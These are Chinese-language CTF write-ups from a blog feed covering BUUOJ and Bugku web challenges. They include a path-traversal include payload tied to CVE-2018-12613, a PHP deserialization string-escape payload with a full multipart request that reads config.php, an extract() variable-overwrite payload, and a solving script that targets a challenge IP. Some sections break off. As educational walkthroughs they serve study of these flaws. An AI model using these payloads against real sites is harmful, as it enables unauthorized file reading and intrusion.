  <entry>
    <title>关于BUUOJ的部分题解</title>
    <url>/Platform-BUUCTF/</url>
    <content><![CDATA[<p>不错的平台，收集了很多比赛的题目。</p>
<a id="more"></a>

<h3 id="WarmUp"><a href="#WarmUp" class="headerlink" title="WarmUp"></a>WarmUp</h3><p>邮件源代码提示<strong>source.php</strong>。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">              <span class="comment">// 判断page是否存在以及其接收到的参数是否为字符串。</span></span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">              <span class="comment">// 判断接收到的参数是否在白名单中。</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">          <span class="comment">// 在接收到的参数后加上问号并截取字符串从0到第一个问号出现的地方。</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 判断截取出来的字符串是否在白名单中</span></span><br><span class="line">          </span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">          <span class="comment">// url解码字符串</span></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">          <span class="comment">// 再次在字符串后加上问号并截取字符串从0到第一个问号出现的地方。</span></span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="comment">// 判断截取出来的字符串是否在白名单中</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">      <span class="comment">// 绕过成功后将其包含进来</span></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>CVE-2018-12613</strong>，包含<strong>hint.php</strong>后提示在<strong>ffffllllaaaagggg</strong>。</p>
<p>简单的代码审计，可以利用<strong>Include</strong>的特性构造如下<strong>Payload</strong>。</p>
<p><strong>?file=hint.php?/../../../../ffffllllaaaagggg</strong>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">flag&#123;k9oct67wctkmbsdkhi32yiip74vsqlvu&#125;</span><br></pre></td></tr></table></figure>

<h3 id="piapiapia"><a href="#piapiapia" class="headerlink" title="piapiapia"></a>piapiapia</h3><p><strong>0CTF-2016</strong>的一道题，源码泄漏在<strong><a href="http://www.zip" target="_blank" rel="noopener">www.zip</a></strong>，这题考察了反序列化逃逸字符，即可以传入恶意字符串提早结束反序列化字符串的操作。</p>
<p>首先是在<strong>update.php</strong>页面接收传进来的表单数据，然后序列化后传给<strong>update_profile()</strong>函数来更新用户信息。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile));</span><br></pre></td></tr></table></figure>

<p>跟过来看一下这个函数，在<strong>class.php</strong>文件中。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span><span class="params">($username, $new_profile)</span> </span>&#123;</span><br><span class="line">$username = <span class="keyword">parent</span>::filter($username);</span><br><span class="line">$new_profile = <span class="keyword">parent</span>::filter($new_profile);</span><br><span class="line"></span><br><span class="line">$where = <span class="string">"username = '$username'"</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">parent</span>::update(<span class="keyword">$this</span>-&gt;table, <span class="string">'profile'</span>, $new_profile, $where);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将序列化后的数据传进了过滤器。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">$escape = <span class="keyword">array</span>(<span class="string">'\''</span>, <span class="string">'\\\\'</span>);</span><br><span class="line">$escape = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $escape) . <span class="string">'/'</span>;</span><br><span class="line">$string = preg_replace($escape, <span class="string">'_'</span>, $string);</span><br><span class="line"></span><br><span class="line">$safe = <span class="keyword">array</span>(<span class="string">'select'</span>, <span class="string">'insert'</span>, <span class="string">'update'</span>, <span class="string">'delete'</span>, <span class="string">'where'</span>);</span><br><span class="line">$safe = <span class="string">'/'</span> . implode(<span class="string">'|'</span>, $safe) . <span class="string">'/i'</span>;</span><br><span class="line"><span class="keyword">return</span> preg_replace($safe, <span class="string">'hacker'</span>, $string);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>将敏感词替换后传入<strong>update()</strong>函数，同时<strong>update.php</strong>中处理<strong>nickname</strong>这个字段的函数可以使用数组绕过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/[^a-zA-Z0-9_]/'</span>, $_POST[<span class="string">'nickname'</span>]) || strlen($_POST[<span class="string">'nickname'</span>]) &gt; <span class="number">10</span>)</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Invalid nickname'</span>);</span><br></pre></td></tr></table></figure>

<p>那么当传入的<strong>nickname</strong>为数组的时候，序列化后得到的结果如下。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;s:<span class="number">5</span>:<span class="string">"phone"</span>;s:<span class="number">11</span>:<span class="string">"12345678910"</span>;s:<span class="number">5</span>:<span class="string">"email"</span>;s:<span class="number">13</span>:<span class="string">"i@southsea.st"</span>;s:<span class="number">8</span>:<span class="string">"nickname"</span>;a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;s:<span class="number">10</span>:<span class="string">"Southseast"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">39</span>:<span class="string">"upload/df419c04c95fc7d58cc6f6f34a2fb7fd"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>则此处利用<strong>filter()</strong>函数，将<strong>where</strong>替换成<strong>hacker</strong>，从而造成字符串逃逸。</p>
<p>要逃逸的字符串为<strong>“;}s:5:”photo”;s:10:”config.php</strong>，长度为<strong>31</strong>，因此需要构造<strong>31</strong>个<strong>where</strong>来转成<strong>hacker</strong>逃逸。</p>
<p>即传入的<strong>nickname</strong>为数组且值如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>

<p>序列化后的值如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;18046429716&quot;;s:5:&quot;email&quot;;s:13:&quot;i@southsea.st&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;df419c04c95fc7d58cc6f6f34a2fb7fd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>若无敏感词替换，则反序列化<strong>unserialize()</strong>方法中将会根据<strong>s:186</strong>读取源数据作为数组<strong>a</strong>的值。</p>
<p>此时敏感词过滤后得到下值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br></pre></td></tr></table></figure>

<p>而序列化后的值如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:4:&#123;s:5:&quot;phone&quot;;s:11:&quot;12345678910&quot;;s:5:&quot;email&quot;;s:13:&quot;i@southsea.st&quot;;s:8:&quot;nickname&quot;;a:1:&#123;i:0;s:186:&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;s:5:&quot;photo&quot;;s:39:&quot;upload&#x2F;df419c04c95fc7d58cc6f6f34a2fb7fd&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>这时反序列化<strong>unserialize()</strong>方法中将会根据<strong>s:186</strong>读取过滤后恰好<strong>186</strong>位的<strong>hacker</strong>作为数组<strong>a</strong>的值。而导致后面字符串<strong>“;}s:5:”photo”;s:10:”config.php</strong>的逃逸，然后被<strong>unserialize()</strong>方法继续读取<strong>config.php</strong>作为头像的地址，而原有的<strong>s:5:”photo”;s:39:”upload/df419c04c95fc7d58cc6f6f34a2fb7fd”;}</strong> 则因为前序逃逸出的字符串导致提前完成反序列化而丢弃，从而造成任意文件读取。</p>
<p>抓包后修改<strong>nickname</strong>字段的<strong>payload</strong>如下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundary7dHeqc39YooT8op0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;phone&quot;</span><br><span class="line"></span><br><span class="line">12345678910</span><br><span class="line">------WebKitFormBoundary7dHeqc39YooT8op0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;email&quot;</span><br><span class="line"></span><br><span class="line">i@southsea.st</span><br><span class="line">------WebKitFormBoundary7dHeqc39YooT8op0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;nickname[]&quot;</span><br><span class="line"></span><br><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php</span><br><span class="line">------WebKitFormBoundary7dHeqc39YooT8op0</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;photo&quot;; filename&#x3D;&quot;timg.jpeg&quot;</span><br><span class="line">Content-Type: image&#x2F;jpeg</span><br><span class="line"></span><br><span class="line">[Content of &#39;&#x2F;Users&#x2F;south&#x2F;Pictures&#x2F;timg.jpeg&#39;]</span><br><span class="line">------WebKitFormBoundary7dHeqc39YooT8op0--</span><br></pre></td></tr></table></figure>

<h3 id="Admin"><a href="#Admin" class="headerlink" title="Admin"></a>Admin</h3><p><strong>HCTF 2018</strong>的题，在<strong>/change</strong>页面右键源代码提示了<a href="https://github.com/woadsl1234/hctf_flask/" target="_blank" rel="noopener">源码</a>。</p>
<p>然后就是审计了，共三种解法。</p>
<h4 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h4><p>在<strong>routes.py</strong>下，路由<strong>/change</strong>和<strong>/register</strong>以及<strong>/login</strong>中在处理用户名都调用了一个方法<strong>strlower()</strong>，跟进看一下，调用了<strong>nodeprep.prepare()</strong>，然后查了一下相关资料，即该函数会将拉丁文转化为对应的大写英文，将大写英文转化成对应的小写英文。</p>
]]></content>
      <categories>
        <category>题解</category>
      </categories>
      <tags>
        <tag>Web</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>关于新Bugku的题解</title>
    <url>/Platform-NewBugku/</url>
    <content><![CDATA[<p>全是水题。。。</p>
<a id="more"></a>

<h3 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a><a href="http://123.206.31.85:10001/" target="_blank" rel="noopener">WEB1</a></h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    header(<span class="string">"Content-type:text/html;charset=utf-8"</span>);</span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">    $b=<span class="string">'ssAEDsssss'</span>;</span><br><span class="line">    extract($_GET);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($a)) &#123;</span><br><span class="line">        $c = trim(file_get_contents($b));</span><br><span class="line">        <span class="keyword">if</span>($a==$c) &#123;</span><br><span class="line">            <span class="keyword">echo</span> $myFlag;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'继续努力，相信flag离你不远了'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>知识点是<a href="https://www.freebuf.com/column/150731.html" target="_blank" rel="noopener">PHP变量覆盖漏洞</a>。</p>
<p>这里使用<strong>extract($_GET)</strong>接收了<strong>GET</strong>请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行<strong>if</strong>条件判断，所以可以使用<strong>GET</strong>提交参数和值，利用<strong>extract()</strong>对变量进行覆盖，从而满足各个条件。</p>
<p>因此<strong>payload</strong>是<strong>?a=&amp;b=</strong>，得到<strong>flag{c3fd1661da5efb989c72b91f3c378759}</strong>。</p>
<h3 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a><a href="http://123.206.31.85:10002/" target="_blank" rel="noopener">WEB2</a></h3><p>看了一下，大概是需要一个时间竞争，写个爬虫就行。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.31.85:10002/'</span></span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'Cookie'</span>: <span class="string">'PHPSESSID=gss81c94di250qs94uq0c5vuhgas9q81'</span>,</span><br><span class="line">    <span class="string">'Content-Type'</span>: <span class="string">'application/x-www-form-urlencoded'</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getText</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    getResult = requests.get(url = url, headers = headers)</span><br><span class="line">    <span class="keyword">return</span> getResult.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFlag</span><span class="params">(result)</span>:</span></span><br><span class="line"></span><br><span class="line">    data = <span class="string">'result='</span> + str(result)</span><br><span class="line">    getResult = requests.post(url = url, data = data, headers = headers)</span><br><span class="line">    <span class="keyword">return</span> getResult.text</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(getText(), features=<span class="string">"lxml"</span>)</span><br><span class="line">cal = soup.find(<span class="string">'p'</span>).get_text(strip=<span class="literal">True</span>).encode(<span class="string">'utf-8'</span>)</span><br><span class="line">cal = re.sub(<span class="string">r'[^\x00-\x7f]'</span>, <span class="string">''</span>, cal)</span><br><span class="line">cal = re.sub(<span class="string">r'[a-z]'</span>, <span class="string">''</span>, cal)</span><br><span class="line">res = BeautifulSoup(getFlag(eval(cal)), features=<span class="string">"lxml"</span>)</span><br><span class="line"><span class="keyword">print</span> res.text</span><br></pre></td></tr></table></figure>

<p>得到<strong>flag{b37d6bdd7bb132c7c7f6072cd318697c}</strong>。</p>
<h3 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a><a href="http://123.206.31.85:10003" target="_blank" rel="noopener">WEB3</a></h3><p>寻思了许久的文件上传，然后发现其实是文件包含<strong>Orz</strong>。</p>
